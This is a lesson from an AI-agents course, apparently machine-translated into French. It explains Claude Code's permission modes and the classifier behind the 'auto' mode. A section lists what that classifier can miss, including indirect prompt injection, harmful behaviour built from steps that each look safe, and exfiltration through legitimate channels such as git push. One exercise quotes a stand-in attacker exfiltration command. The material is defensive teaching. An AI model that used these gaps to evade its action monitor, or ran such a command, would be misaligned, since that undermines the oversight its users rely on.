# Mode d'autorisation pour les agents autonomes

> Une échelle de permissions  niveaux gradués d'autonomie de l'examen-chaque action à l'approbation-tout  est la façon dont un harnais régit ce qu'un agent autonome peut faire sans demander. Claude Code, l'exemple de travail de cette leçon, expose six de ces modes: "plan" demande avant chaque action, "défaut" (étiqueté "Manuel" dans l'interface utilisateur) demande uniquement pour les risques, "acceptEdits" approuve automatiquement les écrits de fichiers mais confirme toujours l'exécution de la coque, et "bypassPermissions" approuve tout. Mode automatique  le `auto`Le mode autorisation  remplace l'approbation par action par un modèle de classification séparé qui examine chaque action avant son exécution et bloque tout ce qui dépasse ce que la demande demande.`max_turns`et `max_budget_usd`. Disponibilité de `auto`dépend du plan, de l'activation de l'org, du modèle et du fournisseur  et Anthropic explique explicitement que le classifiant ne suffit pas à lui seul.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## Le problème

Un agent de codage autonome sur votre machine est une catégorie de sécurité distincte. La surface d'attaque est tout ce que l'agent peut atteindre  système de fichiers, réseau, informations d'identification, planche à dossiers, n'importe quel onglet de navigateur, n'importe quel terminal ouvert. Bruce Schneier et d'autres ont marqué ceci publiquement: les agents d'utilisation informatique ne sont pas une " mise à jour de fonctionnalités " des chatbots, ils sont un nouveau type d'outil avec un nouveau type de profil de risque.

Le système de permission de Claude Code est la réponse de l'Anthropic. Au lieu d'un interrupteur "autonome / non autonome", il existe six modes couvrant une échelle de capacités: plan → par défaut → acceptéModifier → ... → contournerPermissions. Chaque mode est un compromis différent entre la vitesse et l'examen par action. Le mode automatique (mars 2026) ajoute un modèle de classification séparé qui déplace l'approbation de la voie critique de l'utilisateur: il examine chaque action avant qu'elle ne soit exécutée et bloque tout ce qui dépasse la demande.

La question de l'ingénierie: que capture ce système, ce qu'il manque, et quel mode une tâche donnée justifie réellement?

## Le concept

### Les six modes d'autorisation

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Les noms ci-dessus correspondent aux documents publics du code Claude; les étiquettes de l'interface utilisateur `default`comme "Manuel".)

### Mode automatique dans une seule page

Le mode automatique (lancé le 24 mars 2026) est le premier mode d'autorisation pour déléguer l'approbation par action à un modèle.

1. **A separate classifier model.**Révise chaque action proposée avant son exécution, juge la tâche déclarée et l'état actuel de la session, et bloque tout ce qui dépasse ce que la demande a demandé.
2. **Gated availability.**Que ce soit`auto`est proposé en tout dépend du plan, de l'organisation, du modèle et du fournisseur.

Les contrôles budgétaires sont placés à côté du classifiateur:

- `max_turns` l'ensemble des itérations dans une session.
- `max_budget_usd`- Le plafond de dollar qui annule la séance.
- Limits de compte d' action par outil (pas plus de N `WebFetch`les appels, etc.).

### Ce que le système capture

- Injection rapide directe vers l'avant dans les entrées d'outil où l'instruction injectée correspond à une forme d'action connue de risque.
- Les boucles d'outils répétitives  le classifiateur peut voir que l'action N+1 est presque identique à l'action N, cinq fois de suite.
- C'est clairement hors de portée des commandes de shell sur une session de modification de fichiers uniquement.

### Ce que le système peut manquer

- **Subtle prompt injection**L'injection indirecte de prompt n'est pas une vulnérabilité entièrement patchable (tête de préparation OpenAI, 2025, sur les agents de navigation  voir leçon 11).
- **Semantic-level misbehavior.**Chaque action individuelle peut paraître sûre tant que la trajectoire composée est nocive.
- **Exfiltration through legitimate channels.**Écrire des données dans un fichier que vous possédez, alors `git push`En effet, la composition de la question est la composition de la question.

### Cadrage d'aperçu de la recherche

Anthropic a envoyé le mode automatique comme prévisualisation de recherche. La documentation indique explicitement que le classifiant est une couche et non une solution: les utilisateurs doivent combiner le mode automatique avec des budgets, des permissions, des espaces de travail isolés et des audits de trajectoires (leçons 1216). Le cadre d'aperçu reflète également l'écart documenté entre évaluation et déploiement (leçon 1)  un classifiant qui passe des évaluations hors ligne peut se comporter différemment dans une session réelle où le contexte de l'utilisateur est ambigu.

### Où cette échelle vit dans votre flux de travail

- tâche inconnue: démarrer `plan`- La lecture du plan est moins chère que de faire une mauvaise course.
- Refacteur connu: `acceptEdits`Ça économise beaucoup de clics de confirmation.
- Exécution de fond non surveillée: `auto`uniquement dans un espace de travail dont le rayon de déploiement a été mesuré (pas de certificats, pas de montures de production, pas de sortie dans laquelle vous n'avez pas opté).
- Contenants éphémères: `dontAsk`- Je suis là .`bypassPermissions`est acceptable si et seulement si le conteneur et ses informations d'identification sont jetables.

```figure
autonomy-oversight
```

## Utilisez-le

`code/main.py`• une simplification de l'enseignement; le réel`auto`Le mode est soutenu par un modèle de classifiant séparé, et non par un contrat documenté à deux étapes. La phase 1 est une règle de mots clés bon marché sur les actions proposées; la phase 2 est un réviseur multi-règle plus lent. Le conducteur se nourrit d'une courte trajectoire synthétique (actions sûres, une tentative d'injection rapide, une boucle répétitive) et montre où le classifiant attrape et où il manque.

## La faire partir

`outputs/skill-permission-mode-picker.md`correspond une description de tâche au mode d'autorisation approprié, aux limites budgétaires et à l'isolement requis.

## Exercices

1. On court .`code/main.py`Quel type d'action synthétique n'est jamais marqué par la phase 1 mais toujours capturé par la phase 2?

2. Extension de la règle de la phase 1 pour saisir une forme connue de mauvaise qualité (p. ex., `curl $ATTACKER/exfil`) Mesurer le taux de faux positifs sur l'échantillon d'action bénigne.

3. Lisez le document "Comment fonctionne la boucle d'agent" d'Anthropic.`default`Le mode. Vous devriez passer à la porte séparément avant de courir`auto`sans surveillance ?

4. Conception d' un budget de 24 heures sans surveillance: `max_turns`- Je suis là .`max_budget_usd`Les couvertures par outil, les permissions, justifier chaque numéro.

5. Décrivez une trajectoire où chaque action individuelle est approuvée par le classifiateur, mais où le comportement composé est mal aligné. (L'enseignement 14 couvre la façon dont les commutateurs de destruction et les jetons canariens traitent cela.)

## Les termes clés

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Pour en savoir plus

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modes d'autorisation, budgets, format d'action.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) modèle d'exécution des services gérés.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) surface de fonctionnalité et annonce de mode automatique.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) la couche fondée sur la raison qui façonne les jugements des classifiateurs.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Perspective interne sur la conception des permis à long terme.
